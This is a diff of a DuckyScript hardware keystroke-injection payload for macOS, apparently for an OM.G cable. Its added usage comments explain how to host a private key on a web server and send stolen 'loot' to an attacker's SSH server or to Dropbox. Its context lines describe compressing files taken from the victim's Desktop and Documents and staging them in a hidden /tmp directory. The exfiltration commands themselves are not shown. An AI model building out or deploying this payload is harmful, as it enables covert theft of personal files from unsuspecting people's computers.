@@ -6,6 +6,11 @@ REM Target: MacOS 11.0+ (Built-in ssh/scp)
 REM Version: 1.1
 REM Test: Macbook Pro 2019/2020 - Adjust the DELAY times based on your hardware.
 REM Tested with OM.G cable, but should work for any duckyscript capable device.
+REM Usage:
+REM  - Generate a temporary SSH key and configure the authorized_keys file with the public key
+REM  - Host your ssh private key on a web server, and replace with the URL to the private key - line 37
+REM  - Transfer loot over SSH - Configure the target SSH server hostname and credentials      - line 61
+REM  - Transfer loot to Dropbox - Set the API token and the target directory on dropbox       - line 73 
 
 REM DELAY 100
 REM GUI m
@@ -36,7 +41,6 @@ DELAY 300
 
 REM ###################################################################################################
 REM # Compress the looted files.                                                                      #
-REM # In this configuration a list of the home directory and the Downloads directories is generated   #
 REM # The most common loot paths are ~/Desktop and ~/Documents, so they are added by default.          #
 REM ###################################################################################################
 STRING cd /tmp/.s/.t/.e/.a/.l && clear && \
